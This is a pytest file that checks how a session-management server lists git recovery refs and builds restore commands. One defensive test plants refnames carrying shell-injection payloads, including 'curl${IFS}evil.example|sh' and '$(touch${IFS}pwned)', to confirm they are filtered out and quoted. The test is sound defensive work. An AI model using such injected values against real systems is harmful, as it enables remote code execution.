"""A session's recovery refs, live or archived (D-21).

Plan: docs/superpowers/plans/2026-11-06-desktop-parity-d21-followups.md, Task 1.
Review Focus 1-2: the lookup is confined to the session's own namespace, works for an
archived row whose worktree is gone (through the clone), runs on the owning host, and
writes nothing — no DB state, audit row or ref. Real git under ``tmp_path``.
"""
from __future__ import annotations

import asyncio
import os
import subprocess
from datetime import datetime
from pathlib import Path
from unittest.mock import patch

import pytest
from sqlalchemy import func, select

from viberpit import gitrepos, worktrees
from server.db import db_session, init_db
from server.db.models import AuditEvent, Session as DbSession
from server.ipc.client import DaemonError
from server.sessions import worktree_files
from server.sessions.facade import InProcessOrchestratorAdapter
from server.sessions.fleet_orchestrator import _MOVE_BLOCKED, _PER_SESSION, FleetOrchestrator
from server.sessions.orchestrator import SessionOrchestrator
from server.sessions.remote import RemoteOrchestrator
from server.tests.fakes.fake_sdk import FakeSDKClient
from server.tests.test_sessions_actions_api import _ENV, _H, _audit_events, _make_client

REPO = "owner/repo"
SID = "abcd1234-5678-0000-0000-000000000000"
OTHER = "eeee9999-5678-0000-0000-000000000000"
# Shares SID's short id as a PREFIX: a prefix match would leak SID's refs into it.
PREFIX_TWIN = "abcd12345-678-0000-0000-000000000000"
EMPTY: dict[str, object] = {"refs": [], "restoreCommand": None}


def _git(*args: str, cwd: str | Path) -> str:
    return subprocess.run(["git", "-C", str(cwd), *args], check=True,
                          capture_output=True, text=True).stdout.strip()


def _factory(cwd, cfg, can_use_tool, mode, resume, *, on_pre_compact=None,
             options_overlay=None):
    return FakeSDKClient([], on_can_use_tool=can_use_tool)


@pytest.fixture
def env(tmp_path):
    """A managed clone of REPO and a session worktree for SID on ``feature``."""
    root = tmp_path / "root"
    clone = gitrepos.clone_path(str(root), REPO)
    clone.parent.mkdir(parents=True)
    subprocess.run(["git", "init", str(clone), "-b", "main"], check=True, capture_output=True)
    _git("config", "user.email", "t@example.com", cwd=clone)
    _git("config", "user.name", "Test", cwd=clone)
    (clone / "README.md").write_text("hi\n")
    _git("add", "-A", cwd=clone)
    _git("commit", "-m", "init", cwd=clone)
    _git("branch", "feature", cwd=clone)
    info = worktrees.create_worktree(str(clone), "feature", SID, str(root))
    return {"root": root, "clone": clone, "cwd": info.path, "branch": info.branch,
            "db_url": f"sqlite+aiosqlite:///{tmp_path / 'test.db'}", "tmp": tmp_path}


def _row(sid: str, *, cwd: str, repo: str | None = REPO, archived: bool = False,
         host: str | None = None, branch: str | None = None) -> DbSession:
    return DbSession(id=sid, name=sid[:8], account_name="acct1", engine_session_id="c" + sid[:4],
                     status="archived" if archived else "idle", cwd=cwd, repo=repo,
                     branch=branch,
                     archived_at=datetime(2026, 11, 6, 12, 0, 0) if archived else None,
                     host=host)


async def _orch(env, *rows: DbSession) -> SessionOrchestrator:
    await init_db(db_url=env["db_url"])
    async with db_session() as db:
        for row in rows:
            db.add(row)
    orch = SessionOrchestrator(sdk_factory=_factory, repo_root=str(env["root"]))
    await orch.rehydrate()
    return orch


def _dirty(cwd: str, name: str = "work.txt") -> None:
    (Path(cwd) / name).write_text(f"{name} never committed\n")


def _all_recovery_refs(clone) -> list[str]:
    out = _git("for-each-ref", "--format=%(refname)", worktrees.RECOVERY_REF_NS, cwd=clone)
    return out.splitlines()


async def _audit_count() -> int:
    async with db_session() as db:
        return (await db.execute(select(func.count()).select_from(AuditEvent))).scalar_one()


# ── the orchestrator read ────────────────────────────────────────────────────


def test_a_live_session_lists_its_refs_newest_first_with_the_newest_restore(env):
    _dirty(env["cwd"])
    first = worktrees.snapshot_recovery_ref(env["cwd"], SID, reason="drain")
    _dirty(env["cwd"], "more.txt")
    second = worktrees.snapshot_recovery_ref(env["cwd"], SID, reason="discard")
    assert first and second and first != second

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"], branch=env["branch"]))
        assert SID in orch._records
        return await orch.session_recovery_refs(SID)

    out = asyncio.run(run())
    assert [r["ref"] for r in out["refs"]] == [second, first]
    assert [r["reason"] for r in out["refs"]] == ["discard", "drain"]
    assert out["refs"][0]["sha"] == _git("rev-parse", second, cwd=env["clone"])
    created = [datetime.fromisoformat(r["createdAt"]) for r in out["refs"]]
    assert created[0] >= created[1]
    assert out["restoreCommand"] == worktrees.restore_command(second)
    assert [r["restoreCommand"] for r in out["refs"]] == [
        f"git restore --source={second} --worktree --staged -- . && git reset",
        f"git restore --source={first} --worktree --staged -- . && git reset"]
    assert set(out["refs"][0]) == {"ref", "reason", "sha", "createdAt", "restoreCommand"}


def test_an_archived_session_whose_worktree_is_gone_lists_refs_through_the_clone(env):
    _dirty(env["cwd"])
    assert worktrees.remove_worktree(env["cwd"], force=True, session_id=SID)
    assert not Path(env["cwd"]).exists()
    kept = worktrees.recovery_refs(str(env["clone"]), SID)
    assert kept and kept[0].endswith(f"-{worktrees.RECOVERY_FORCED}")

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"], archived=True))
        orch._records.pop(SID, None)   # an archived session has no live record
        return await orch.session_recovery_refs(SID)

    out = asyncio.run(run())
    assert [r["ref"] for r in out["refs"]] == kept
    assert out["refs"][0]["reason"] == worktrees.RECOVERY_FORCED
    assert out["restoreCommand"] == worktrees.restore_command(kept[0])


def test_a_live_record_whose_worktree_is_gone_also_falls_back_to_the_clone(env):
    _dirty(env["cwd"])
    assert worktrees.remove_worktree(env["cwd"], force=True, session_id=SID)

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"]))
        return await orch.session_recovery_refs(SID)

    assert asyncio.run(run())["refs"]


@pytest.mark.parametrize("archived", [False, True])
def test_a_scratch_session_answers_empty(env, archived):
    scratch = env["tmp"] / "scratch"
    scratch.mkdir()

    async def run():
        orch = await _orch(env, _row(SID, cwd=str(scratch), repo=None, archived=archived))
        if archived:
            orch._records.pop(SID, None)
        return await orch.session_recovery_refs(SID)

    assert asyncio.run(run()) == EMPTY


def test_an_archived_session_with_no_local_clone_answers_empty(env):
    async def run():
        orch = await _orch(env, _row(SID, cwd=str(env["tmp"] / "gone"),
                                     repo="someone/never-cloned", archived=True))
        orch._records.pop(SID, None)
        return await orch.session_recovery_refs(SID)

    assert asyncio.run(run()) == EMPTY


def test_another_sessions_refs_are_never_listed(env):
    """OTHER and PREFIX_TWIN share the clone; PREFIX_TWIN's short id starts with SID's."""
    root = str(env["root"])
    other = worktrees.create_worktree(str(env["clone"]), "feature", OTHER, root)
    _dirty(other.path)
    other_ref = worktrees.snapshot_recovery_ref(other.path, OTHER, reason="drain")
    twin_ref = worktrees.snapshot_recovery_ref(other.path, PREFIX_TWIN, reason="delete")
    assert other_ref and twin_ref

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"]),
                           _row(OTHER, cwd=other.path),
                           _row(PREFIX_TWIN, cwd=other.path, archived=True))
        mine = await orch.session_recovery_refs(SID)
        twin = await orch.session_recovery_refs(PREFIX_TWIN)
        return mine, twin

    mine, twin = asyncio.run(run())
    assert mine == EMPTY
    assert [r["ref"] for r in twin["refs"]] == [twin_ref]


def test_a_planted_ref_is_never_listed_or_the_restore_source(env):
    """Review fix: git allows ``;``, ``$``, ``|`` … in a refname, and anyone in the
    worktree can plant one under the session's namespace. Only names
    ``_write_recovery_ref`` writes are listed, and the restore command is quoted."""
    _dirty(env["cwd"])
    good = worktrees.snapshot_recovery_ref(env["cwd"], SID, reason="drain")
    head = _git("rev-parse", "HEAD", cwd=env["clone"])
    ns = f"{worktrees.RECOVERY_REF_NS}/abcd1234"
    # Sorts after the good ref, so it would be "newest" and the restore source.
    planted = [f"{ns}/zzz;curl${{IFS}}evil.example|sh", f"{ns}/$(touch${{IFS}}pwned)-drain"]
    for ref in planted:
        _git("update-ref", ref, head, cwd=env["clone"])

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"]))
        return await orch.session_recovery_refs(SID)

    out = asyncio.run(run())
    assert [r["ref"] for r in out["refs"]] == [good]
    assert out["restoreCommand"] == worktrees.restore_command(good)
    assert "curl" not in out["restoreCommand"] and "$(" not in out["restoreCommand"]
    assert worktrees.recovery_refs(str(env["clone"]), SID) == [good]


def test_an_unreadable_worktree_falls_back_to_the_clone(env):
    """A ``.git`` that git cannot read (its gitdir is gone) is not "no refs": the clone
    still holds them."""
    _dirty(env["cwd"])
    ref = worktrees.snapshot_recovery_ref(env["cwd"], SID, reason="drain")
    (Path(env["cwd"]) / ".git").write_text(f"gitdir: {env['tmp'] / 'nowhere'}\n")

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"]))
        return await orch.session_recovery_refs(SID)

    assert [r["ref"] for r in asyncio.run(run())["refs"]] == [ref]


def test_an_unknown_session_is_a_key_error_marked_as_an_expected_refusal(env):
    async def run():
        orch = await _orch(env)
        await orch.session_recovery_refs("nope")

    with pytest.raises(KeyError) as ei:
        asyncio.run(run())
    assert ei.value.error_data == {"code": worktree_files.SESSION_NOT_FOUND}  # type: ignore[attr-defined]


def test_every_entrys_restore_command_is_built_by_restore_command_and_quoted(env, monkeypatch):
    """Each entry's command comes from ``worktrees.restore_command`` for THAT ref, so
    it is shell-quoted whenever the ref would need it. (The listing filter already
    keeps such names out; this pins the per-entry path on its own.)"""
    import shlex
    from datetime import timezone
    when = datetime(2026, 11, 6, 12, 0, tzinfo=timezone.utc)
    odd = worktrees.RecoveryRef(ref="refs/viberpit/recovery/abcd1234/a b;$(x)", sha="a" * 40,
                                reason="drain", created_at=when)
    plain = worktrees.RecoveryRef(ref="refs/viberpit/recovery/abcd1234/p", sha="b" * 40,
                                  reason="delete", created_at=when)
    monkeypatch.setattr(worktrees, "recovery_ref_entries", lambda *_a: [odd, plain])

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"]))
        return await orch.session_recovery_refs(SID)

    out = asyncio.run(run())
    first, second = out["refs"]
    assert first["restoreCommand"] == worktrees.restore_command(odd.ref)
    assert f"--source={shlex.quote(odd.ref)} " in first["restoreCommand"]
    assert second["restoreCommand"] == (
        f"git restore --source={plain.ref} --worktree --staged -- . && git reset")
    assert out["restoreCommand"] == first["restoreCommand"]


def test_the_read_writes_nothing(env):
    """Review Focus 2: no audit row, no session-row change, no new or pruned ref."""
    _dirty(env["cwd"])
    assert worktrees.snapshot_recovery_ref(env["cwd"], SID, reason="drain")

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"]))
        async with db_session() as db:
            before_row = (await db.get(DbSession, SID)).__dict__.copy()
        audits = await _audit_count()
        refs = _all_recovery_refs(env["clone"])
        await orch.session_recovery_refs(SID)
        async with db_session() as db:
            after_row = (await db.get(DbSession, SID)).__dict__.copy()
        return audits, await _audit_count(), refs, before_row, after_row

    audits_before, audits_after, refs, before_row, after_row = asyncio.run(run())
    assert audits_after == audits_before
    assert _all_recovery_refs(env["clone"]) == refs
    before_row.pop("_sa_instance_state")
    after_row.pop("_sa_instance_state")
    assert after_row == before_row


# ── the route ────────────────────────────────────────────────────────────────


def _route_client(result=None, error: Exception | None = None):
    client, fake = _make_client()
    calls: list[str] = []

    async def session_recovery_refs(sid):
        calls.append(sid)
        if error is not None:
            raise error
        return result

    fake.session_recovery_refs = session_recovery_refs
    return client, calls


def test_route_returns_the_daemons_answer_and_writes_no_audit():
    body = {"refs": [{"ref": "refs/viberpit/recovery/abcd1234/x-drain", "reason": "drain",
                      "sha": "a" * 40, "createdAt": None}],
            "restoreCommand": "git restore …"}
    client, calls = _route_client(result=body)
    with patch.dict(os.environ, _ENV), client:
        r = client.get(f"/api/sessions/{SID}/recovery-refs", headers=_H)
        events = client.portal.call(_audit_events)
    assert r.status_code == 200, r.text
    assert r.json() == body
    assert calls == [SID]
    assert events == []


def test_route_404s_an_unknown_session_and_logs_info(caplog):
    client, _ = _route_client(error=KeyError(SID))
    with patch.dict(os.environ, _ENV), client, caplog.at_level("INFO"):
        r = client.get(f"/api/sessions/{SID}/recovery-refs", headers=_H)
    assert r.status_code == 404
    hits = [rec for rec in caplog.records if "recovery refs" in rec.getMessage()]
    assert hits and all(rec.levelname == "INFO" for rec in hits)


def test_route_maps_an_old_daemon_to_409_daemon_outdated():
    client, _ = _route_client(error=DaemonError("UnknownMethod", "session_recovery_refs"))
    with patch.dict(os.environ, _ENV), client:
        r = client.get(f"/api/sessions/{SID}/recovery-refs", headers=_H)
    assert r.status_code == 409
    assert r.json()["detail"]["code"] == "daemon_outdated"


# ── RPC / remote / facade / fleet ────────────────────────────────────────────


class _RecordingClient:
    def __init__(self, result=None, error: Exception | None = None):
        self.result, self.error = result, error
        self.calls: list[tuple[str, dict]] = []

    async def call(self, method, *, timeout=None, **kwargs):
        self.calls.append((method, kwargs))
        if self.error is not None:
            raise self.error
        return self.result


@pytest.mark.asyncio
async def test_remote_forwards_and_rebuilds_an_unknown_session():
    client = _RecordingClient(result=EMPTY)
    assert await RemoteOrchestrator(client).session_recovery_refs(SID) == EMPTY
    assert client.calls == [("session_recovery_refs", {"session_id": SID})]
    with pytest.raises(KeyError):
        await RemoteOrchestrator(_RecordingClient(
            error=DaemonError("KeyError", "nope"))).session_recovery_refs("nope")


def test_an_archived_row_crosses_the_real_daemon_envelope(env):
    """Edge → RemoteOrchestrator → mTLS-shaped RPC → the owning daemon's real
    orchestrator, for an archived session whose worktree is gone."""
    from server.ipc.client import DaemonClient
    from server.ipc.daemon import create_daemon_app
    from server.ipc.orchestrator_rpc import register_orchestrator_rpc
    from server.tests.ipc_harness import serve_daemon_uds

    _dirty(env["cwd"])
    assert worktrees.remove_worktree(env["cwd"], force=True, session_id=SID)
    kept = worktrees.recovery_refs(str(env["clone"]), SID)

    async def run():
        orch = await _orch(env, _row(SID, cwd=env["cwd"], archived=True))
        orch._records.pop(SID, None)
        app = create_daemon_app()
        register_orchestrator_rpc(app, orch)
        async with serve_daemon_uds(app) as sock:
            client = DaemonClient(sock)
            try:
                ro = RemoteOrchestrator(client)
                out = await ro.session_recovery_refs(SID)
                with pytest.raises(KeyError):
                    await ro.session_recovery_refs("nope")
            finally:
                await client.aclose()
        return out

    out = asyncio.run(run())
    assert [r["ref"] for r in out["refs"]] == kept
    assert out["restoreCommand"] == worktrees.restore_command(kept[0])


class _HostOrch:
    def __init__(self, name):
        self.name, self.calls = name, []

    async def session_recovery_refs(self, sid):
        self.calls.append(sid)
        return {"host": self.name}


class _Router:
    def __init__(self, orchs):
        self._orchs = orchs

    def get(self, name):
        return self._orchs[name]

    def names(self):
        return sorted(self._orchs)


def test_fleet_routes_an_archived_row_to_the_host_its_row_names(env):
    """``_host_for`` reads ``row.host`` whatever the row's status, so an archived
    worker session's read (not in the route cache) runs on the worker — where the
    clone with its refs lives — and a move never blocks it."""
    assert "session_recovery_refs" in _PER_SESSION
    assert "session_recovery_refs" not in _MOVE_BLOCKED

    async def run():
        await init_db(db_url=env["db_url"])
        async with db_session() as db:
            db.add(_row(SID, cwd=env["cwd"], archived=True, host="rocky"))
            db.add(_row(OTHER, cwd=env["cwd"], archived=True, host="dobby"))
        dobby, rocky = _HostOrch("dobby"), _HostOrch("rocky")
        fo = FleetOrchestrator(_Router({"dobby": dobby, "rocky": rocky}),  # type: ignore[arg-type]
                               primary="dobby")
        assert SID not in fo._host_cache
        first = await fo.session_recovery_refs(SID)
        fo._moving[SID] = "dobby"
        during_move = await fo.session_recovery_refs(SID)
        other = await fo.session_recovery_refs(OTHER)
        return first, during_move, other, dobby.calls, rocky.calls

    first, during_move, other, dobby_calls, rocky_calls = asyncio.run(run())
    assert first == during_move == {"host": "rocky"}
    assert other == {"host": "dobby"}
    assert rocky_calls == [SID, SID] and dobby_calls == [OTHER]


@pytest.mark.asyncio
async def test_facade_forwards():
    adapter = InProcessOrchestratorAdapter(_HostOrch("dobby"))  # type: ignore[arg-type]
    assert await adapter.session_recovery_refs(SID) == {"host": "dobby"}
